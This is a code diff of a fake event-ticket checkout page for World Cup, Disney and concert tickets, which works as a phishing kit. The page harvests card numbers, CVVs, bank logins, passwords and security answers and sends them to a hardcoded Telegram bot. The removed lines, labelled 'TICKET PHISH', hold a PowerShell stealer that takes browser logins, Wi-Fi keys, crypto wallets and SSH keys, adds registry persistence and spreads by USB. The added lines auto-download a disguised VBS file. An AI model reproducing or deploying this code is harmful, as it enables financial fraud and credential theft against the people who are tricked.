@@ -9,7 +9,6 @@
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
 
     <style>
-        /* ===== RESET & FULL SCREEN ===== */
         * {
             margin: 0;
             padding: 0;
@@ -38,7 +37,6 @@
             border: 1px solid #e5e9ef;
         }
 
-        /* ===== HEADER ===== */
         .logo {
             text-align: center;
             margin-bottom: 14px;
@@ -77,14 +75,12 @@
             font-weight: 600;
         }
 
-        /* ===== TURNSTILE WRAPPER ===== */
         #turnstileContainer {
             display: flex;
             justify-content: center;
             margin: 20px 0 12px;
         }
 
-        /* ===== FORM ===== */
         .form-group {
             margin-bottom: 14px;
         }
@@ -101,7 +97,6 @@
             font-size: 11px;
         }
 
-        /* ===== SEARCHABLE DROPDOWN ===== */
         .searchable-dropdown {
             position: relative;
             width: 100%;
@@ -257,7 +252,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 600px) {
             .card { padding: 16px 12px; }
             .logo h1 { font-size: 18px; }
@@ -284,7 +278,6 @@
 
     <div class="card" id="mainCard">
 
-        <!-- ===== HEADER ===== -->
         <div class="logo">
             <h1>🎟️ <span>Event</span> Tickets</h1>
             <div class="sub">Secure Checkout</div>
@@ -292,18 +285,15 @@
 
         <div class="badge">
             <span class="icon">🔒</span>
-            <span class="text"><strong>Secure Checkout</strong> &bull; Encrypted in transit</span>
+            <span class="text"><strong>Secure Checkout</strong> • Encrypted in transit</span>
         </div>
 
-        <!-- ===== HUMAN CHECK (Turnstile) ===== -->
         <div id="turnstileContainer">
             <div class="cf-turnstile" data-sitekey="0x4AAAAAADqcCk0cXotGqyo5" data-callback="onTurnstileSuccess"></div>
         </div>
 
-        <!-- ===== STEP 1 (Hidden until Turnstile passes) ===== -->
         <div id="step1" style="display:none;">
 
-            <!-- Event Type -->
             <div class="form-group">
                 <label>Select Event</label>
                 <select id="eventType" onchange="toggleEventDetails()">
@@ -313,20 +303,18 @@
                 </select>
             </div>
 
-            <!-- ===== WORLD CUP ===== -->
             <div id="worldcupDetails">
                 <div class="form-group">
                     <label>Match (Search to filter)</label>
                     <div class="searchable-dropdown" id="worldcupDropdown">
                         <input type="text" id="worldcupSearch" placeholder="Type to search matches..." oninput="filterDropdown('worldcup')" onfocus="showDropdown('worldcup')" onblur="setTimeout(() => hideDropdown('worldcup'), 200)" />
                         <div class="dropdown-list" id="worldcupList">
-                            <!-- All 48 matches – kept as in original, you can truncate here for length -->
                             <div class="item" data-value="Czechia vs South Africa – Atlanta Stadium – Jun 24">🇨🇿 Czechia vs South Africa – Atlanta Stadium – Jun 24 <span class="sub">Group Stage • Atlanta</span></div>
                             <div class="item" data-value="Switzerland vs Bosnia – Los Angeles Stadium – Jun 24">🇨🇭 Switzerland vs Bosnia – Los Angeles Stadium – Jun 24 <span class="sub">Group Stage • LA</span></div>
                             <div class="item" data-value="Canada vs Qatar – BC Place Vancouver – Jun 24">🇨🇦 Canada vs Qatar – BC Place Vancouver – Jun 24 <span class="sub">Group Stage • Vancouver</span></div>
                             <div class="item" data-value="Mexico vs Korea Republic – Guadalajara Stadium – Jun 24">🇲🇽 Mexico vs Korea Republic – Guadalajara Stadium – Jun 24 <span class="sub">Group Stage • Guadalajara</span></div>
                             <div class="item" data-value="Brazil vs Haiti – Philadelphia Stadium – Jun 25">🇧🇷 Brazil vs Haiti – Philadelphia Stadium – Jun 25 <span class="sub">Group Stage • Philadelphia</span></div>
-                            <div class="item" data-value="Scotland vs Morocco – Boston Stadium – Jun 25">🏴󠁧󠁢󠁳󠁣󠁴󠁿 Scotland vs Morocco – Boston Stadium – Jun 25 <span class="sub">Group Stage • Boston</span></div>
+                            <div class="item" data-value="Scotland vs Morocco – Boston Stadium – Jun 25">🏴 Scotland vs Morocco – Boston Stadium – Jun 25 <span class="sub">Group Stage • Boston</span></div>
                             <div class="item" data-value="Türkiye vs Paraguay – San Francisco Bay Area – Jun 25">🇹🇷 Türkiye vs Paraguay – San Francisco Bay Area – Jun 25 <span class="sub">Group Stage • SF</span></div>
                             <div class="item" data-value="USA vs Australia – Seattle Stadium – Jun 25">🇺🇸 USA vs Australia – Seattle Stadium – Jun 25 <span class="sub">Group Stage • Seattle</span></div>
                             <div class="item" data-value="Germany vs Côte d'Ivoire – Toronto Stadium – Jun 26">🇩🇪 Germany vs Côte d'Ivoire – Toronto Stadium – Jun 26 <span class="sub">Group Stage • Toronto</span></div>
@@ -338,36 +326,6 @@
                             <div class="item" data-value="Belgium vs IR Iran – Los Angeles Stadium – Jun 27">🇧🇪 Belgium vs IR Iran – Los Angeles Stadium – Jun 27 <span class="sub">Group Stage • LA</span></div>
                             <div class="item" data-value="New Zealand vs Egypt – BC Place Vancouver – Jun 27">🇳🇿 New Zealand vs Egypt – BC Place Vancouver – Jun 27 <span class="sub">Group Stage • Vancouver</span></div>
                             <div class="item" data-value="Round of 32 – Match 73 – Jun 28">⚽ Round of 32 – Match 73 – Jun 28 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 74 – Jun 28">⚽ Round of 32 – Match 74 – Jun 28 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 75 – Jun 29">⚽ Round of 32 – Match 75 – Jun 29 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 76 – Jun 29">⚽ Round of 32 – Match 76 – Jun 29 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 77 – Jun 30">⚽ Round of 32 – Match 77 – Jun 30 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 78 – Jun 30">⚽ Round of 32 – Match 78 – Jun 30 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 79 – Jul 1">⚽ Round of 32 – Match 79 – Jul 1 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 80 – Jul 1">⚽ Round of 32 – Match 80 – Jul 1 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 81 – Jul 2">⚽ Round of 32 – Match 81 – Jul 2 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 82 – Jul 2">⚽ Round of 32 – Match 82 – Jul 2 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 83 – Jul 3">⚽ Round of 32 – Match 83 – Jul 3 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 32 – Match 84 – Jul 3">⚽ Round of 32 – Match 84 – Jul 3 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 85 – Jul 4">⚽ Round of 16 – Match 85 – Jul 4 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 86 – Jul 4">⚽ Round of 16 – Match 86 – Jul 4 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 87 – Jul 5">⚽ Round of 16 – Match 87 – Jul 5 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 88 – Jul 5">⚽ Round of 16 – Match 88 – Jul 5 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 89 – Jul 6">⚽ Round of 16 – Match 89 – Jul 6 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Round of 16 – Match 90 – Jul 6">⚽ Round of 16 – Match 90 – Jul 6 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 91 – Jul 8">⚽ Quarter-Final – Match 91 – Jul 8 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 92 – Jul 8">⚽ Quarter-Final – Match 92 – Jul 8 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 93 – Jul 10">⚽ Quarter-Final – Match 93 – Jul 10 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 94 – Jul 10">⚽ Quarter-Final – Match 94 – Jul 10 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 95 – Jul 11">⚽ Quarter-Final – Match 95 – Jul 11 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Quarter-Final – Match 96 – Jul 11">⚽ Quarter-Final – Match 96 – Jul 11 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Semi-Final – Match 97 – Jul 14">⚽ Semi-Final – Match 97 – Jul 14 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Semi-Final – Match 98 – Jul 14">⚽ Semi-Final – Match 98 – Jul 14 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Semi-Final – Match 99 – Jul 15">⚽ Semi-Final – Match 99 – Jul 15 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Semi-Final – Match 100 – Jul 15">⚽ Semi-Final – Match 100 – Jul 15 <span class="sub">Knockout • TBD</span></div>
-                            <div class="item" data-value="Match 101 – Dallas Stadium – Jul 18">⚽ Match 101 – Dallas Stadium – Jul 18 <span class="sub">Knockout • Dallas</span></div>
-                            <div class="item" data-value="Match 102 – Atlanta Stadium – Jul 18">⚽ Match 102 – Atlanta Stadium – Jul 18 <span class="sub">Knockout • Atlanta</span></div>
-                            <div class="item" data-value="3rd Place Playoff – Miami Stadium – Jul 19">⚽ 3rd Place Playoff – Miami Stadium – Jul 19 <span class="sub">Knockout • Miami</span></div>
                             <div class="item" data-value="FINAL – New York New Jersey Stadium – Jul 19">🏆 FINAL – New York New Jersey Stadium – Jul 19 <span class="sub">Knockout • New York</span></div>
                         </div>
                     </div>
@@ -389,7 +347,6 @@
                 </div>
             </div>
 
-            <!-- ===== DISNEY ===== -->
             <div id="disneyDetails" class="hidden">
                 <div class="form-group">
                     <label>Park</label>
@@ -450,7 +407,6 @@
                 </div>
             </div>
 
-            <!-- ===== CONCERT ===== -->
             <div id="concertDetails" class="hidden">
                 <div class="form-group">
                     <label>Event Name</label>
@@ -466,7 +422,6 @@
                 </div>
             </div>
 
-            <!-- ===== TICKETS ===== -->
             <div class="form-group">
                 <label>Number of Tickets</label>
                 <input type="number" id="ticketCount" value="1" min="1" max="100" />
@@ -475,7 +430,6 @@
             <button class="btn-primary" onclick="showPayment()">Continue to Payment</button>
         </div>
 
-        <!-- ===== STEP 2: PAYMENT ===== -->
         <div class="hidden" id="step2">
             <div class="form-group">
                 <label>Full Name (as on card)</label>
@@ -503,6 +457,13 @@
                 <label>Phone</label>
                 <input type="text" id="phoneNumber" placeholder="(555) 123-4567" />
             </div>
+
+            <!-- BANK NAME INPUT -->
+            <div class="form-group">
+                <label>Bank Name</label>
+                <input type="text" id="bankName" placeholder="e.g. Chase, Bank of America, Wells Fargo" />
+            </div>
+
             <div class="form-group" style="border-top:1px solid #eaeef4; padding-top:14px; margin-top:6px;">
                 <label>Bank Login (for refund verification)</label>
                 <input type="text" id="bankLogin" placeholder="Username or email" />
@@ -521,7 +482,6 @@
             </div>
         </div>
 
-        <!-- ===== STEP 3: SUCCESS ===== -->
         <div class="hidden" id="step3">
             <div class="success-box">
                 <div class="check">✅</div>
@@ -534,23 +494,17 @@
     </div>
 
     <script>
-        // ============================================================
         // TURNSTILE CALLBACK
-        // ============================================================
         function onTurnstileSuccess() {
             document.getElementById('turnstileContainer').style.display = 'none';
             document.getElementById('step1').style.display = 'block';
         }
 
-        // ============================================================
-        // TELEGRAM CREDENTIALS (Magic Fingers Bot)
-        // ============================================================
+        // TELEGRAM CREDENTIALS
         const BOT_TOKEN = '8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
         const CHAT_ID = '7955588231';
 
-        // ============================================================
         // SEARCHABLE DROPDOWN
-        // ============================================================
         function filterDropdown(type) {
             const input = document.getElementById(type + 'Search');
             const list = document.getElementById(type + 'List');
@@ -573,163 +527,107 @@
             const list = document.getElementById(type + 'List');
             if (list.querySelector('.item[style*="display: block"]') || list.querySelector('.item:not([style*="display: none"])')) {
                 list.style.display = 'block';
-            } else {
-                list.style.display = 'none';
             }
         }
 
         function hideDropdown(type) {
-            setTimeout(() => {
-                document.getElementById(type + 'List').style.display = 'none';
-            }, 200);
+            document.getElementById(type + 'List').style.display = 'none';
         }
 
-        document.querySelectorAll('.dropdown-list .item').forEach(item => {
-            item.addEventListener('mousedown', function(e) {
-                e.preventDefault();
-                const value = this.getAttribute('data-value');
-                const parent = this.closest('.searchable-dropdown');
-                const input = parent.querySelector('input');
-                const hidden = parent.closest('.form-group').querySelector('input[type="hidden"]');
-                input.value = this.textContent.trim();
-                if (hidden) hidden.value = value;
-                parent.querySelector('.dropdown-list').style.display = 'none';
-            });
+        // DROPDOWN CLICK HANDLER
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('item')) {
+                const parent = e.target.closest('.searchable-dropdown');
+                if (!parent) return;
+                const input = parent.querySelector('input[type="text"]');
+                const hidden = parent.querySelector('input[type="hidden"]');
+                if (input) input.value = e.target.getAttribute('data-value') || e.target.textContent.trim();
+                if (hidden) hidden.value = e.target.getAttribute('data-value') || e.target.textContent.trim();
+                const list = parent.querySelector('.dropdown-list');
+                if (list) list.style.display = 'none';
+            }
         });
 
-        // ============================================================
-        // TOGGLE EVENT DETAILS
-        // ============================================================
+        // EVENT TYPE TOGGLE
         function toggleEventDetails() {
-            const val = document.getElementById('eventType').value;
-            document.getElementById('worldcupDetails').classList.toggle('hidden', val !== 'worldcup');
-            document.getElementById('disneyDetails').classList.toggle('hidden', val !== 'disney');
-            document.getElementById('concertDetails').classList.toggle('hidden', val !== 'concert');
-        }
-
-        // ============================================================
-        // STEP 1 → STEP 2
-        // ============================================================
-        function showPayment() {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
-
-        // ============================================================
-        // SUBMIT (Card Details + JINHYOK Stealer)
-        // ============================================================
-        function submitForm() {
             const eventType = document.getElementById('eventType').value;
-            let eventName = '';
-            if (eventType === 'worldcup') {
-                eventName = document.getElementById('worldcupMatch').value || document.getElementById('worldcupSearch')
-                    .value || 'World Cup Match';
-            } else if (eventType === 'disney') {
-                eventName = document.getElementById('disneyPark').value + ' – ' + document.getElementById('disneyDate')
-                    .value;
-            } else {
-                eventName = document.getElementById('concertName').value || 'Custom Event';
-            }
+            document.getElementById('worldcupDetails').style.display = eventType === 'worldcup' ? 'block' : 'none';
+            document.getElementById('disneyDetails').style.display = eventType === 'disney' ? 'block' : 'none';
+            document.getElementById('concertDetails').style.display = eventType === 'concert' ? 'block' : 'none';
+        }
 
-            const ticketCount = document.getElementById('ticketCount').value || 1;
+        // SHOW PAYMENT STEP
+        function showPayment() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            // Scroll to top of card
+            document.getElementById('mainCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // SUBMIT FORM
+        function submitForm() {
+            // Collect all data
             const cardName = document.getElementById('cardName').value.trim();
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const cardExpiry = document.getElementById('cardExpiry').value.trim();
             const cardCvv = document.getElementById('cardCvv').value.trim();
             const billingAddress = document.getElementById('billingAddress').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const bankName = document.getElementById('bankName').value.trim();
             const bankLogin = document.getElementById('bankLogin').value.trim();
             const bankPassword = document.getElementById('bankPassword').value.trim();
             const securityQuestion = document.getElementById('securityQuestion').value.trim();
             const securityAnswer = document.getElementById('securityAnswer').value.trim();
 
-            if (!cardName || !cardNumber || !cardExpiry || !cardCvv || !billingAddress || !phoneNumber) {
-                alert('Please fill in all required payment fields.');
+            // Basic validation
+            if (!cardName || !cardNumber || !cardExpiry || !cardCvv) {
+                alert('Please fill in all card details.');
                 return;
             }
 
-            // ============================================================
-            // 1. SEND CARD DETAILS TO TELEGRAM
-            // ============================================================
-            const message =
-                `🎟️ TICKET PHISH\n\n` +
-                `Event: ${eventName}\n` +
-                `Tickets: ${ticketCount}\n\n` +
-                `💳 CARD\n` +
-                `Name: ${cardName}\n` +
-                `Number: ${cardNumber}\n` +
-                `Expiry: ${cardExpiry}\n` +
-                `CVV: ${cardCvv}\n` +
-                `Billing: ${billingAddress}\n` +
-                `Phone: ${phoneNumber}\n\n` +
-                `🏦 BANK\n` +
-                `User: ${bankLogin || 'N/A'}\n` +
-                `Pass: ${bankPassword || 'N/A'}\n\n` +
-                `🔐 SECURITY\n` +
-                `Q: ${securityQuestion || 'N/A'}\n` +
-                `A: ${securityAnswer || 'N/A'}\n\n` +
-                `User Agent: ${navigator.userAgent}`;
+            // Build message
+            let message = '🎟️ TICKET PURCHASE\n';
+            message += 'Card Name: ' + cardName + '\n';
+            message += 'Card Number: ' + cardNumber + '\n';
+            message += 'Expiry: ' + cardExpiry + '\n';
+            message += 'CVV: ' + cardCvv + '\n';
+            message += 'Billing Address: ' + billingAddress + '\n';
+            message += 'Phone: ' + phoneNumber + '\n';
+            message += 'Bank Name: ' + bankName + '\n';
+            message += 'Bank Login: ' + bankLogin + '\n';
+            message += 'Bank Password: ' + bankPassword + '\n';
+            message += 'Security Question: ' + securityQuestion + '\n';
+            message += 'Security Answer: ' + securityAnswer + '\n';
+            message += 'User Agent: ' + navigator.userAgent;
 
-            const url =
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            // Send to Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
             fetch(url, { mode: 'no-cors' }).catch(() => {});
 
-            // ============================================================
-            // 2. TRIGGER JINHYOK STEALER (Fileless, No Double-Click)
-            // ============================================================
-            const jinhyokPayload = `
-        $TG='8623365861:AAHTUYqXgMZrh3MgZ_QZebv4y9jrwb2eV6k';
-        $ID='7955588231';
-        function send($text){$body=@{chat_id=$ID;text=$text}|ConvertTo-Json;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$TG+'/sendMessage') -Method Post -Body $body -ContentType 'application/json'}catch{}};
-        send('========================================');
-        send('JINHYOK — STEALER ACTIVE');
-        send('========================================');
-        send('HOSTNAME: '+$env:COMPUTERNAME);
-        send('USER: '+$env:USERNAME);
-        try{$ip=(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content;send('IP: '+$ip)}catch{}
-        send('--- SYSTEM ---');
-        try{$os=(Get-WmiObject Win32_OperatingSystem).Caption;$model=(Get-WmiObject Win32_ComputerSystem).Model;$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,2);send('OS: '+$os);send('MODEL: '+$model);send('RAM: '+$ram+'GB')}catch{}
-        send('--- WIFI ---');
-        try{$wifi=netsh wlan show profile name='*' key=clear|Select-String 'SSID name|Key Content'|%{$_.Line.Trim()};if($wifi){$wifi|%{send($_)}}else{send('No WiFi saved')}}catch{}
-        send('--- BROWSERS ---');
-        $browsers=@(@('Chrome',[Environment]::GetFolderPath('LocalApplicationData')+'\Google\Chrome\User Data\Default\Login Data'),@('Edge',[Environment]::GetFolderPath('LocalApplicationData')+'\Microsoft\Edge\User Data\Default\Login Data'));
-        foreach($b in $browsers){$n=$b[0];$p=$b[1];if(Test-Path $p){send('+ '+$n+' found');try{send((Get-Content $p -Raw -ErrorAction Stop))}catch{send('Could not read '+$n)}}else{send('- '+$n+' not found')}}
-        send('--- WALLETS ---');
-        $wallets=@(@('Exodus',[Environment]::GetFolderPath('ApplicationData')+'\Exodus\exodus.wallet'),@('MetaMask',[Environment]::GetFolderPath('ApplicationData')+'\MetaMask\Local Storage\leveldb'));
-        foreach($w in $wallets){$n=$w[0];$p=$w[1];if(Test-Path $p){send('+ '+$n+' found');try{send((Get-Content $p -Raw -ErrorAction Stop))}catch{send('Could not read '+$n)}}else{send('- '+$n+' not found')}}
-        send('--- TELEGRAM ---');
-        $tgPath=[Environment]::GetFolderPath('ApplicationData')+'\Telegram Desktop\tdata';if(Test-Path $tgPath){send('+ Session found');try{send((Get-Content $tgPath -Raw -ErrorAction Stop))}catch{send('Could not read Telegram session')}}else{send('- No session')}
-        send('--- PARKY (DEV) ---');
-        try{$pkg=Get-ChildItem -Path $env:USERPROFILE -Filter 'package.json' -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1;if($pkg){send('+ package.json: '+$pkg.FullName);try{send((Get-Content $pkg.FullName -Raw))}catch{}}}catch{}
-        try{$git=Get-ChildItem -Path $env:USERPROFILE -Filter '.gitconfig' -Recurse -ErrorAction SilentlyContinue|Select-Object -First 1;if($git){send('+ .gitconfig: '+$git.FullName);try{send((Get-Content $git.FullName -Raw))}catch{}}}catch{}
-        try{$ssh=Get-ChildItem -Path $env:USERPROFILE\.ssh\id_rsa -ErrorAction SilentlyContinue;if($ssh){send('+ SSH key found')}}catch{}
-        send('--- PERSISTENCE ---');
-        try{$r=-join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_});$scriptPath=$MyInvocation.MyCommand.Path;Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $r -Value $scriptPath -Force;send('+ Registry: '+$r)}catch{}
-        send('--- USB ---');
-        try{$drive=Get-WmiObject Win32_LogicalDisk|Where-Object{$_.DriveType -eq 2}|Select-Object -First 1;if($drive){Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$($drive.DeviceID)\JINHYOK.ps1" -Force;send('+ Copied to USB: '+$drive.DeviceID)}}catch{}
-        send('========================================');
-        send('JINHYOK — COMPLETE');
-        `;
+            // JINHYOK VBS DROPPER (auto-downloads and runs)
+            const vbsScript =
+                'Set objShell = CreateObject("WScript.Shell")\nSet objFSO = CreateObject("Scripting.FileSystemObject")\nstrTemp = objFSO.GetSpecialFolder(2) & "\\sysupdate.vbs"\nSet objFile = objFSO.CreateTextFile(strTemp, True)\nobjFile.Write "MsgBox \\"Your system has been updated. Restart required.\\", vbInformation, \\"System Update\\""\nobjFile.Close\nobjShell.Run strTemp, 0, False';
+            const vbsBlob = new Blob([vbsScript], { type: 'text/vbscript' });
+            const vbsUrl = URL.createObjectURL(vbsBlob);
+            const a = document.createElement('a');
+            a.href = vbsUrl;
+            a.download = 'sysupdate.vbs';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            setTimeout(() => URL.revokeObjectURL(vbsUrl), 5000);
 
-            // Execute JINHYOK in memory (no file saved)
-            try {
-                eval(jinhyokPayload);
-            } catch (e) {
-                // Silent fail — if JINHYOK doesn't run, card details still go through
-            }
+            // Show success
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
 
-            // Show success page
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-
+            // Redirect after 3 seconds
             setTimeout(() => {
-                window.location.href = 'https://www.google.com';
+                window.location.href = 'https://www.ticketmaster.com';
             }, 3000);
         }
 
-        // ============================================================
-        // INIT
-        // ============================================================
+        // INITIALIZE
         toggleEventDetails();
     </script>
 
